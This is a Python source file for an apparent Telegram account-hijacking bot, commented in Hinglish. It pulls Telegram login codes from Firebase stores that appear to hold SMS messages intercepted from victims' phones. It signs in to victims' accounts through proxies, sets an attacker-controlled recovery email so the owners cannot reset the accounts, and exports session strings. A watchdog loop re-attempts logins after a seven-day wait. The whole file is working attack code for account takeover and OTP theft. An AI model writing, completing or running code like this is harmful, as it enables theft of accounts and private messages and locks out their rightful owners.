import asyncio
import logging
import time
import random
import traceback
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, RPCError
import config
import database as db
from services.warp_manager import get_warp_proxy, start_warp
import firebase_utils as fbu

log = logging.getLogger("TGAuto")
_WARP_READY = False

async def ensure_warp():
    global _WARP_READY
    if not _WARP_READY:
        _WARP_READY = await start_warp()
    return _WARP_READY

# 🚨 Firebase URL se SIRF SMS OTP nikalne ka function
async def wait_for_firebase_otp(phone_number, timeout=120):
    start_time = time.time()
    clean_phone = ''.join(filter(str.isdigit, phone_number))[-10:]
    
    while time.time() - start_time < timeout:
        try:
            d = db.load_data()
            fbs = d.get("firebases", [])
            
            for fb in fbs[:5]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue
                
                for dev_id, c in clients.items():
                    if not isinstance(c, dict): continue
                    
                    best_nums = fbu.extract_best_numbers(c, [])
                    if not best_nums: continue
                    
                    if best_nums[0][0] == clean_phone:
                        msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", fb.get("auth"))
                        if not msgs: continue
                        
                        for m in msgs.values():
                            if not isinstance(m, dict): continue
                            if m.get("type") != "incoming": continue
                            
                            text = m.get("message", "")
                            if "telegram" in text.lower():
                                otp = fbu.extract_otp(text)
                                if otp:
                                    log.info(f"Found SMS OTP from Firebase: {otp}")
                                    return otp
        except Exception as e:
            log.error(f"Firebase OTP error: {e}")
        
        await asyncio.sleep(5)
    return None

# 🚨 NAYA: Bot pe live progress bhejne ke liye (Owner ko)
async def update_owner_progress(bot, text):
    try:
        await bot.send_message(config.MAIN_OWNER, f"🤖 <b>AI PROGRESS:</b>\n{text}", parse_mode="HTML")
    except:
        pass

async def auto_login_tg(bot, phone_number):
    log.info(f"Starting Auto-Login for {phone_number}")
    await update_owner_progress(bot, f"🔍 <b>Started Hunting:</b> <code>{phone_number}</code>\n⏳ Connecting to WARP Proxy...")
    
    d = db.load_data()
    if not d.get("hunting_enabled", True):
        return {"status": "failed", "reason": "Hunting is disabled by Owner"}

    proxy_dict = None
    if await ensure_warp():
        proxy_dict = get_warp_proxy()
    
    if not proxy_dict:
        proxies = d.get("working_proxies", [])
        if proxies:
            p = random.choice(proxies)
            ip, port = p.split(":")[:2]
            proxy_dict = {"scheme": "socks5", "hostname": ip, "port": int(port)}

    app = Client(
        name=f"temp_{phone_number.replace('+', '')}",
        api_id=config.TG_API_ID,
        api_hash=config.TG_API_HASH,
        phone_number=phone_number,
        in_memory=True,
        proxy=proxy_dict
    )

    try:
        await app.connect()
        await update_owner_progress(bot, f"📡 Connected to Telegram. Sending OTP request...")
        
        try:
            sent_code = await app.send_code(phone_number)
        except FloodWait as e:
            await app.disconnect()
            return {"status": "failed", "reason": f"FloodWait: {e.value}s"}
            
        await update_owner_progress(bot, f"⏳ <b>OTP Request Sent!</b>\nWait kar raha hu SMS OTP ka (Firebase URL se)... Timeout: 120s")
        
        # 🚨 Sirf Firebase (SMS) se OTP dhundho
        otp = await wait_for_firebase_otp(phone_number, timeout=120)
        
        if not otp:
            await app.disconnect()
            return {"status": "failed", "reason": "SMS OTP timeout (Firebase URL me OTP nahi aaya)."}

        await update_owner_progress(bot, f"🔑 <b>OTP Mila (SMS):</b> <code>{otp}</code>\n🔐 Login kar raha hu...")
        
        try:
            await app.sign_in(phone_number, sent_code.phone_code_hash, otp)
        except SessionPasswordNeeded:
            await app.disconnect()
            return {"status": "failed", "reason": "2FA Password Enabled (Manual intervention needed)"}
        except PhoneCodeInvalid:
            await app.disconnect()
            return {"status": "failed", "reason": "Invalid OTP"}

        # 🚨 NAYA: Login successful! Ab Master Email set karo
        await update_owner_progress(bot, f"✅ <b>Login Successful!</b>\nAb Master Email laga raha hu (taaki koi aur reset na kar sake)...")
        
        try:
            await app.update_profile(email=config.MASTER_EMAIL)
            log.info(f"Master Email set for {phone_number}")
            await update_owner_progress(bot, f"🔒 <b>Master Email Set!</b> ({config.MASTER_EMAIL})\nAccount is now protected.")
        except Exception as email_err:
            log.warning(f"Could not set email: {email_err}")
            await update_owner_progress(bot, f"⚠️ Email set nahi ho paya: {email_err}")

        session_string = await app.export_session_string()
        await app.disconnect()

        return {"status": "success", "session": session_string, "phone": phone_number}

    except Exception as e:
        error_details = traceback.format_exc()
        log.error(f"Login failed:\n{error_details}")
        if app.is_connected: 
            await app.disconnect()
        return {"status": "failed", "reason": str(e)}

async def reset_watchdog_loop(bot):
    while True:
        d = db.load_data()
        if not d.get("hunting_enabled", True):
            await asyncio.sleep(3600)
            continue
            
        tg_accounts = d.get("telegram_accounts", {})
        now = int(time.time())
        updated = False
        
        for phone, acc in tg_accounts.items():
            if acc.get("status") == "waiting_7_days":
                if now >= acc.get("reset_time", 0):
                    await update_owner_progress(bot, f"🕒 <b>7 Days Complete!</b>\n{phone} ka timer khatam. Re-login try kar raha hu...")
                    res = await auto_login_tg(bot, phone)
                    if res["status"] == "success":
                        acc["session"] = res["session"]
                        acc["status"] = "active"
                    else:
                        acc["status"] = "failed"
                        acc["reason"] = res["reason"]
                    updated = True
        
        if updated: db.save_data(d)
        await asyncio.sleep(3600)
